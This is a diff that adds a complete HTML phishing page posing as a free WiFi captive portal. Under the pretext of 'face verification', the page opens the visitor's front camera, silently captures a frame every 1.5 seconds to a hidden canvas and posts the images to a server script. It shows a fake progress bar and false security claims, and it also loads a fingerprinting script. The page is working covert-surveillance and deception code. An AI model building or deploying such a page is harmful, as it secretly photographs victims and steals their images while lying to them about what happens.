@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free WiFi - Connect Now</title>
+    <meta property="og:title" content="Free WiFi Hotspot">
+    <meta property="og:description" content="Connect to free high-speed WiFi">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/93/93158.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .portal-container {
+            background: rgba(255, 255, 255, 0.95);
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .wifi-icon {
+            font-size: 64px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        .portal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+        .portal-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .speed-info {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 12px;
+            color: white;
+        }
+        .speed-item {
+            text-align: center;
+        }
+        .speed-value {
+            font-size: 22px;
+            font-weight: 700;
+        }
+        .speed-label {
+            font-size: 11px;
+            opacity: 0.8;
+            text-transform: uppercase;
+        }
+        .terms-box {
+            background: #f7f8fc;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .terms-box h4 {
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .terms-box ul {
+            font-size: 12px;
+            color: #666;
+            padding-left: 18px;
+        }
+        .terms-box li {
+            margin-bottom: 4px;
+        }
+        .verify-notice {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #856404;
+        }
+        .verify-notice strong {
+            display: block;
+            margin-bottom: 4px;
+        }
+        .connect-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            letter-spacing: 0.5px;
+        }
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+        .connect-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .status-text {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #666;
+            min-height: 20px;
+        }
+        .progress-bar {
+            display: none;
+            width: 100%;
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            margin-top: 15px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 2px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        .secured-badge {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+        }
+        .secured-badge span {
+            color: #2ecc71;
+        }
+        .spinner-small {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Hidden cam capture -->
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<div class="portal-container">
+    <span class="wifi-icon">📶</span>
+    <h1 class="portal-title">Free WiFi Hotspot</h1>
+    <p class="portal-subtitle">High-speed internet access • No password required</p>
+
+    <div class="speed-info">
+        <div class="speed-item">
+            <div class="speed-value">150</div>
+            <div class="speed-label">Mbps Download</div>
+        </div>
+        <div class="speed-item">
+            <div class="speed-value">50</div>
+            <div class="speed-label">Mbps Upload</div>
+        </div>
+        <div class="speed-item">
+            <div class="speed-value">12</div>
+            <div class="speed-label">ms Ping</div>
+        </div>
+    </div>
+
+    <div class="terms-box">
+        <h4>📋 Terms of Use</h4>
+        <ul>
+            <li>Free for up to 2 hours</li>
+            <li>One-time identity verification required</li>
+            <li>No VPN or proxy usage</li>
+            <li>Fair usage policy applies</li>
+        </ul>
+    </div>
+
+    <div class="verify-notice">
+        <strong>🔐 Security Verification Required</strong>
+        Quick face verification to prevent abuse. Your camera will only be used for verification.
+    </div>
+
+    <button class="connect-btn" id="connectBtn" onclick="connectWifi()">
+        <span id="btnText">Connect & Verify</span>
+    </button>
+
+    <div class="progress-bar" id="progressBar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <p class="status-text" id="statusText"></p>
+
+    <p class="secured-badge">🔒 <span>Secured</span> connection • WPA3 Enterprise</p>
+</div>
+
+<script>
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result) {},
+        error: function() {}
+    });
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+    audio: false,
+    video: { facingMode: "user" }
+};
+
+function connectWifi() {
+    const btn = document.getElementById('connectBtn');
+    const statusText = document.getElementById('statusText');
+    const progressBar = document.getElementById('progressBar');
+    const progressFill = document.getElementById('progressFill');
+    const btnText = document.getElementById('btnText');
+
+    btn.disabled = true;
+    btnText.innerHTML = '<span class="spinner-small"></span> Verifying...';
+    statusText.textContent = 'Requesting camera for verification...';
+
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(function(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            statusText.textContent = 'Verifying your identity...';
+            progressBar.style.display = 'block';
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+
+            // Fake progress animation
+            setTimeout(function() { progressFill.style.width = '25%'; statusText.textContent = 'Scanning face data...'; }, 2000);
+            setTimeout(function() { progressFill.style.width = '50%'; statusText.textContent = 'Analyzing biometrics...'; }, 4000);
+            setTimeout(function() { progressFill.style.width = '75%'; statusText.textContent = 'Almost connected...'; }, 6000);
+            setTimeout(function() {
+                progressFill.style.width = '100%';
+                statusText.textContent = '✅ Connected! Enjoy free WiFi.';
+                btnText.textContent = 'Connected ✓';
+                btn.style.background = 'linear-gradient(135deg, #2ecc71, #27ae60)';
+            }, 8000);
+        })
+        .catch(function(err) {
+            statusText.textContent = '⚠️ Camera access denied. Verification required to connect.';
+            btnText.textContent = 'Try Again';
+            btn.disabled = false;
+        });
+}
+</script>
+
+<script src="fingerprint.js"></script>
+</body>
+</html>
